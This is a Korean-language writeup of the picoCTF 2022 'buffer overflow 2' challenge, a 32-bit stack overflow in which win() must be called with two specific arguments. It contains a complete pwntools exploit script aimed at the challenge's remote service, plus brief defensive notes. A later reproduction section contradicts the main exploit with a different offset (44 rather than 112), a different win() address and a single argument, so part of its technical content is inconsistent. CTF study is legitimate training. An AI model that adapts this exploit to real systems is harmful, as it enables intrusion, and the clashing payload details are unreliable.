---
title: buffer overflow 2 — picoCTF 2022 pwn writeup
created: 2026-06-15
updated: 2026-06-16
type: query
tags: [ctf, pwn, ret2win, function-arguments, x86, stack-overflow, picoctf]
sources: [https://ctftime.org/writeup/32814, https://qiita.com/housu_jp/items/5e05dcb71901a3ca2604, https://musyokaian.medium.com/buffer-overflow-2-picoctf-2022-590cf7b7961f]
confidence: high
---

# buffer overflow 2 — picoCTF 2022 pwn writeup

> `buffer overflow 2`는 **32-bit 스택 오버플로로 `win(arg1, arg2)`를 호출해야 하는 picoCTF 2022 Binary Exploitation 문제**입니다. 핵심은 **리턴 주소 덮기 + 함수 인자 두 개를 정확히 스택에 배치**하는 것입니다.

## 1. 핵심 요약

- 바이너리는 **32-bit x86**입니다.
- `gets()`로 입력을 받아 버퍼를 overflow할 수 있습니다.
- `win()`은 다음 조건을 만족해야 flag를 출력합니다.
  - `arg1 == 0xCAFEF00D`
  - `arg2 == 0xF00DF00D`
- 오프셋은 **112 bytes**로 알려져 있습니다.

## 2. 문제 구조

| 항목 | 내용 |
|------|------|
| 플랫폼 | picoCTF 2022 |
| 분류 | pwn / ret2win with arguments |
| 아키텍처 | 32-bit x86 |
| 핵심 요소 | saved EIP overwrite, stack argument placement |
| 오프셋 | 112 |
| 목표 | `win(0xCAFEF00D, 0xF00DF00D)` 호출 |

## 3. 공격 흐름

1. `vuln()`의 버퍼를 overflow합니다.
2. saved return address를 `win()`으로 덮습니다.
3. `win()`이 기대하는 두 인자를 스택에 맞게 배치합니다.
4. `main()` 복귀용 값과 filler 1개를 포함해 스택 레이아웃을 맞춥니다.
5. `win()`이 flag를 출력합니다.

## 4. 왜 가능한가

이 문제는 단순한 ret2win이 아니라 **호출 규약에 맞는 인자 세팅**이 필요합니다. 32-bit x86 cdecl에서는 함수 인자가 스택에 올라가므로, 리턴 주소 뒤에 올바른 값들을 순서대로 배치하면 원하는 인자를 가진 함수 호출이 가능합니다.

## 5. 익스플로잇 예시

```python
from pwn import *  # pwntools를 불러옵니다.

elf = context.binary = ELF('./vuln')  # 바이너리를 로드합니다.

# 로컬/원격 실행을 선택하는 헬퍼입니다.
def start():
    if args.REMOTE:
        return remote('saturn.picoctf.net', 49754)  # 원격 서비스 예시입니다.
    return process(elf.path)  # 로컬에서 실행합니다.

io = start()

offset = 112  # saved EIP까지의 정확한 오프셋입니다.
win = 0x08049296  # win() 함수 주소입니다.
arg1 = 0xCAFEF00D  # 첫 번째 인자입니다.
arg2 = 0xF00DF00D  # 두 번째 인자입니다.

payload = flat(
    b'A' * offset,   # 버퍼를 채웁니다.
    p32(win),        # return address를 win()으로 바꿉니다.
    p32(0x1),        # filler / saved EBP+4 역할입니다.
    p32(arg1),       # win(arg1, ...)
    p32(arg2)        # win(..., arg2)
)

io.sendlineafter(b':', payload)  # 입력을 보냅니다.
io.interactive()                 # flag 출력 후 확인합니다.
```


## 재현 절차

1. 오프셋과 `win()` 주소를 확인합니다.
```bash
# 심볼과 보호기법을 먼저 확인합니다.
file ./vuln              # 예상: ELF 32-bit LSB executable
checksec --file=./vuln    # 예상: NX / Canary / PIE 상태가 출력됩니다.
objdump -t ./vuln | grep win  # 예상: win 함수 주소가 출력됩니다.
```
2. 함수 인자를 포함한 ret2win 페이로드를 만듭니다.
```python
# saved return address 뒤에 인자도 함께 넣는 예시입니다.
from pwn import *
payload = b"A" * 44              # 예상: 저장된 반환 주소까지 도달합니다.
payload += p32(0x080491f6)        # 예시: win() 주소입니다.
payload += p32(0xdeadbeef)        # 예시: win() 인자입니다.
print(payload)
```
3. 페이로드를 넣어 flag 출력 여부를 확인합니다.
## 6. 방어 관점 메모

- `gets()`는 즉시 제거해야 합니다.
- 함수 인자를 스택에서 신뢰하면 ret2win에 취약합니다.
- PIE와 canary가 없으면 공격이 매우 단순해집니다.
- 입력 길이 제한과 safe API 사용이 필수입니다.

## 7. 비교 포인트

- `x-sixty-what`은 **64-bit 단일 인자 없는 ret2win**입니다.
- `buffer overflow 2`는 **32-bit ret2win with arguments**입니다.
- `buffer overflow 3`는 **stack canary brute force**입니다.
- `Stack Cache`는 **stack leak + ret2win**입니다.

## 8. 참고 자료

- [CTFtime — buffer overflow 2 / Writeup](https://ctftime.org/writeup/32814)
- [Qiita — picoCTF 2022 buffer overflow 2 Writeup](https://qiita.com/housu_jp/items/5e05dcb71901a3ca2604)
- [Musyoka Ian — Buffer Overflow 2 : picoCTF 2022](https://musyokaian.medium.com/buffer-overflow-2-picoctf-2022-590cf7b7961f)
- [[ret2win-with-arguments-ctf-patterns]]
- [[stack-leak-ret2win-ctf-patterns]]
